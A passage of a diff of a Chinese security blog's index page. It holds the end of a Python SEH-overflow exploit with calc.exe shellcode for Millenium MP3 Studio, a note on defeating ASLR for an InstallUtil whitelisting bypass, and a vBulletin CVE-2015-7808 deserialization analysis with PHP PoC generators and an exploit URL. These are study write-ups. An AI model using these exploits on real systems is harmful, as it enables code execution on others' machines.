class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">file_name = <span class="string">"exp.mpf"</span></span><br><span class="line"><span class="comment">#msf-pattern_create -l 5000</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">4112</span></span><br><span class="line">nseh = <span class="string">"\xeb\x32\x90\x90"</span> <span class="comment">#jump 50 bytes</span></span><br><span class="line"><span class="comment"># nseh = "\xcc\xcc\xcc\xcc"</span></span><br><span class="line">seh = <span class="string">"\x98\x4e\x01\x10"</span>  <span class="comment">#0x10014e98</span></span><br><span class="line"><span class="comment"># nops = ""</span></span><br><span class="line">nops = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d\x1a' -f c EXITFUNC=thread</span></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">"\xbb\xf2\x3b\x6a\x19\xdb\xcc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"</span></span><br><span class="line"><span class="string">"\x31\x83\xc2\x04\x31\x5a\x0f\x03\x5a\xfd\xd9\x9f\xe5\xe9\x9c"</span></span><br><span class="line"><span class="string">"\x60\x16\xe9\xc0\xe9\xf3\xd8\xc0\x8e\x70\x4a\xf1\xc5\xd5\x66"</span></span><br><span class="line"><span class="string">"\x7a\x8b\xcd\xfd\x0e\x04\xe1\xb6\xa5\x72\xcc\x47\x95\x47\x4f"</span></span><br><span class="line"><span class="string">"\xcb\xe4\x9b\xaf\xf2\x26\xee\xae\x33\x5a\x03\xe2\xec\x10\xb6"</span></span><br><span class="line"><span class="string">"\x13\x99\x6d\x0b\x9f\xd1\x60\x0b\x7c\xa1\x83\x3a\xd3\xba\xdd"</span></span><br><span class="line"><span class="string">"\x9c\xd5\x6f\x56\x95\xcd\x6c\x53\x6f\x65\x46\x2f\x6e\xaf\x97"</span></span><br><span class="line"><span class="string">"\xd0\xdd\x8e\x18\x23\x1f\xd6\x9e\xdc\x6a\x2e\xdd\x61\x6d\xf5"</span></span><br><span class="line"><span class="string">"\x9c\xbd\xf8\xee\x06\x35\x5a\xcb\xb7\x9a\x3d\x98\xbb\x57\x49"</span></span><br><span class="line"><span class="string">"\xc6\xdf\x66\x9e\x7c\xdb\xe3\x21\x53\x6a\xb7\x05\x77\x37\x63"</span></span><br><span class="line"><span class="string">"\x27\x2e\x9d\xc2\x58\x30\x7e\xba\xfc\x3a\x92\xaf\x8c\x60\xf8"</span></span><br><span class="line"><span class="string">"\x2e\x02\x1f\x4e\x30\x1c\x20\xfe\x59\x2d\xab\x91\x1e\xb2\x7e"</span></span><br><span class="line"><span class="string">"\xd6\xc1\x50\xab\x22\x6a\xcd\x3e\x8f\xf7\xee\x94\xd3\x01\x6d"</span></span><br><span class="line"><span class="string">"\x1d\xab\xf5\x6d\x54\xae\xb2\x29\x84\xc2\xab\xdf\xaa\x71\xcb"</span></span><br><span class="line"><span class="string">"\xf5\xc8\x14\x5f\x95\x20\xb3\xe7\x3c\x3d"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(junk+nseh+seh+nops+shellcode)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"exp.mpf File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/exp.png" alt="seh"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/12/23/Easy-RM-to-MP3-Conversion-Utility-Stack-Based-Overflows/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/23/Easy-RM-to-MP3-Conversion-Utility-Stack-Based-Overflows/" class="post-title-link" itemprop="url">Easy RM to MP3 Conversion Utility Stack Based Overflows</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-22 21:06:48 / 修改时间：13:08:53" itemprop="dateCreated datePublished" datetime="2021-12-22T21:06:48Z">2021-12-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Windows Exploitation</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/12/23/Easy-RM-to-MP3-Conversion-Utility-Stack-Based-Overflows/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/12/23/Easy-RM-to-MP3-Conversion-Utility-Stack-Based-Overflows/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/12/23/Defcon27-CSharp-Workshop-%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/23/Defcon27-CSharp-Workshop-%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Defcon27 CSharp Workshop 学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-22 20:59:03 / 修改时间：13:45:22" itemprop="dateCreated datePublished" datetime="2021-12-22T20:59:03Z">2021-12-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Bypass-Tricks/" itemprop="url" rel="index"><span itemprop="name">Bypass Tricks</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/12/23/Defcon27-CSharp-Workshop-%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/12/23/Defcon27-CSharp-Workshop-%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>vs编译64位程序的时候会默认增加ASLR，如果需要修改的话，需要手动在csproj文件中的<PropertyGround>下面增加<HighEntropyVA>False<HighEntropyGround>。msbuild会增加地址随机化，这是msbuild的默认安全机制，csc默认不会加，我是用dnspy比较两个c#可执行程序发现的。更进一步 InstallUtil.exe bypass的时候，win10 x64下如果c#利用代码编译为x86 是可以执行的，如果编译为x64 又会出现内存不可读，原因是64位InstallUtil自带ASLR，取消掉它的ASLR 发现x64的利用代码又可以执行了。谷歌能搜到的都是win7环境 目测win7 x64还没有普遍开启ASLR。</HighEntropyGround></HighEntropyVA></PropertyGround></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/08/10/Linux%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1452,375 +1757,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" class="post-title-link" itemprop="url">Kali安装Parallels Desktop Tools失败问题解决</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-22 16:54:42 / 修改时间：10:30:16" itemprop="dateCreated datePublished" datetime="2021-04-22T16:54:42Z">2021-04-22</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本人Mac安装的Paralles版本为16.1.3（49160）。安装的Kali内核版本为<code>Linux kali 5.10.0-kali4-amd64 #1 SMP Debian 5.10.19-1kali1 (2021-03-03) x86_64 GNU/Linux</code>。在给Kai虚拟机安装<code>Parallels Tools</code>的时候，出现如下错误：</p>
-<img src="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/Parallels.png" class>
-
-<p>这个问题的原因是Kali内核版本与Parallels Tools的版本不兼容。在此吐槽一下官方支持非常滞后，对Linux的支持烂透了。</p>
-<p>在论坛上找到解决办法，需要patch Parallels Tools安装目录下的kmods中的某两个文件。具体可以参看具体patch文件。</p>
-<p>我目前的版本适合的是kernel 5.9.1的patch。建议手工patch，具体修改内容参见patch文档。</p>
-<p>patch完之后，需要将解压的文件重新打包为<strong>prl_mod.tar.gz</strong>，打包命令为<code>tar -zcvf prl_mod.tar.gz</code>.</p>
-<p>参考链接：</p>
-<p><a href="https://forum.parallels.com/threads/path-for-kernel-5-9-1.351222/" target="_blank" rel="noopener">Path for kernel 5.9.1</a></p>
-<p><a href="https://forum.parallels.com/threads/tools-patch-procedure.351669/" target="_blank" rel="noopener">Tools Patch Procedure</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">vBulletin 5.x CVE-2015-7808漏洞分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-06-21 19:40:39" itemprop="dateCreated datePublished" datetime="2020-06-21T19:40:39Z">2020-06-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-21 11:46:12" itemprop="dateModified" datetime="2021-06-21T11:46:12Z">2021-06-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Code-Audit/" itemprop="url" rel="index"><span itemprop="name">Code Audit</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 <code>unserialize()</code> 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。在分析的时候，<code>vBulletin 5.0.x</code>和<code>vBulletin 5.1.x</code>两个版本漏洞触发的条件略有不同。</p>
-<p>网上能够找到的<code>vBulletin</code>源码不多，本地搭建了基于<code>vBulletin 5.0.0</code>和<code>vBulletin 5.1.5</code>两个版本的docker环境。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先来分析一波<code>vBulletin 5.0.x</code>的漏洞利用，先看下网上提供的Payload的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
-
-<p>PoC的构造很重要，可以大致分析出反序列化的调用链。</p>
-<p>请求的url如下</p>
-<p><code>http://0.0.0.0:8080/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D</code></p>
-<p>通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将 <code>ajax/api/hook/decodeArguments</code>  作为路由参数 $_REQUEST[‘routestring’] 传递给地址路由处理过程。</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin1.png" alt="vbulletin1"></p>
-<p>因其符合 <code>ajax/api/[controller]/[method]</code>  的 Ajax API 请求路由格式，会再调用<code>includes/vb5/frontend/controller/ajax.php</code>下的 <code>vB5_Frontend_Controller_Ajax</code>实例中的 <code>index()</code> 函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin2.png" alt="vbulletin3"></p>
-<p>然后调用<code>includes/vb5/frontend/controller/ajax.php</code>下的<code>actionApi</code>函数：<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin12.png" alt="vbulletin12"></p>
-<p>然后调用<code>includes/api/interface/collapsed.php</code>下的<code>callApi</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin3.png" alt="vbulletin3"></p>
-<p>接着调用<code>core/vb/api/wrapper.php</code>下的<code>__call</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin10.png" alt="vbulletin10"></p>
-<p>接着调用<code>core/vb/api.php</code>下的<code>callNamed</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin5.png" alt="vbulletin4"></p>
-<p>接着调用<code>core/vb/api/hook.php</code>下面的<code>decodeArguments</code>函数，其中的<code>unserialize</code>函数是漏洞的触发点，通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有 <strong><em><code>__wakeup()</code>或者<br><code>__destruct()</code></em></strong> 魔术方法存在问题的类来进行利用。网上文章（文章已经不能访问）所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的 <strong><em><code>vB_dB_Result</code></em></strong> 类，由于<code>$args = @unserialize($arguments)</code>  产生了一个迭代器 <code>vB_dB_Result</code>类实例，因此在后面进行 foreach  操作时会首先调用其 <code>rewind()</code>函数。</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin6.png" alt="vbulletin6"></p>
-<p>往下执行：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin7.png" alt="vbulletin7"></p>
-<p>调用<code>core/vb/db/result.php</code>下面的<code>rewind</code>函数,在 <code>rewind()</code> 函数处理过程中，会根据实例变量状态进行调用:</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin8.png" alt="vbulletin8"></p>
-<p>这里就可以通过反序列化来控制 <code>$this-&gt;recordset</code>的值，并且 <code>$this-&gt;db-&gt;free_result</code>最终会调用：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin9.png" alt="vbulletin9"></p>
-<p><code>$this-&gt;functions[&#39;free_result&#39;]</code>原本的初始化值为 “mysql_free_result”，但是由于反序列化的原因，我们也能控制 “vB_dB_Result” 类实例中的 “db” 成员，更改其对应的 <code>functions[&#39;free_result&#39;]</code>为我们想要执行的函数，因此一个任意代码执行就产生了。<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin13.png" alt="vbulletin13"></p>
-<p>在进行测试的时候发现网上所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.5 版本中<code>core/vb/database.php</code>的<strong><em><code>vB_Database</code></em></strong> 被定义成了抽象类：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The type of result set to return from the database for a specific row.</span></span><br></pre></td></tr></table></figure>
-
-<p>抽象类是不能直接进行实例化的，网上提供的 PoC 却是实例化的 <code>vB_Database</code> 类作为 <code>vB_dB_Result</code> 迭代器成员 <code>db</code> 的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败，这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。</p>
-<p>为了解决这个问题，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的 <strong><em><code>autoload()</code></em></strong>方法去动态加载类文件。这里 vBulletin 会依次调用<strong><em><code>includes/vb5/autoloader.php</code></em></strong>中的<strong><em><code>_autoload</code></em></strong>方法和 <strong><em><code>core/vb/vb.php</code></em></strong>中的 <strong><em><code>autoload()</code></em></strong>方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行 <strong><em><code>$this-&gt;db-&gt;free_result($this-&gt;recordset)</code></em></strong>， 则需要找到一个继承于 <strong><em><code>vB_Database</code></em></strong>抽象类的子类并且其源码文件路径能够在<strong><em><code>autoload</code></em></strong>过程中得到加载。在源码根路径下执行<strong><em><code>grep -in &quot;extends vB_Database&quot; -r . --color</code></em></strong>可以得到：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin16.png" alt="vbulletin16"></p>
-<p>来看下<code>unserialize</code>函数反序列化的细节。</p>
-<p>首先进入<code>includes/vb5/autoloader.php</code>的<code>__autoload</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin14.png" alt="vbulletin14"></p>
-<p>可以看到对提供的类名以 “_” 进行了拆分，动态构造了加载路径。（第二次<code>autoload()</code>的过程大致相同）</p>
-<p>函数调用完成之后，进入<code>core/vb/vb.php</code>下的<code>autoload</code>函数。<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin15.png" alt="vbulletin15"></p>
-<p>可以发现只有在反序列化 <strong><em><code>vB_Database_MySQL</code></em></strong> 和 <strong><em><code>vB_Database_MySQLi</code></em></strong>这两个基于 <code>vB_Database</code>抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。</p>
-<p>所以，针对 5.1.5 版本 vBulletin 的 PoC 就可以得到了，使用 <strong><em><code>vB_Database_MySQL</code></em></strong> 或者 <strong><em><code>vB_Database_MySQLi</code></em></strong>作为迭代器 <strong><em><code>vB_dB_Result</code></em></strong>成员 “db” 的值即可。具体 PoC 如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database_MySQL</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'assert'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database_MySQL();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="string">'phpinfo()'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
-
-<p>另外，[Check Point][<a href="https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/]在其官方博客上也公布了反序列化的另一个利用点，利用魔术方法，反序列化出一个模版对象最终调用" target="_blank" rel="noopener">https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/]在其官方博客上也公布了反序列化的另一个利用点，利用魔术方法，反序列化出一个模版对象最终调用</a> <code>eval()</code> 函数进行执行。</p>
-<p>先来看下POC代码：</p>
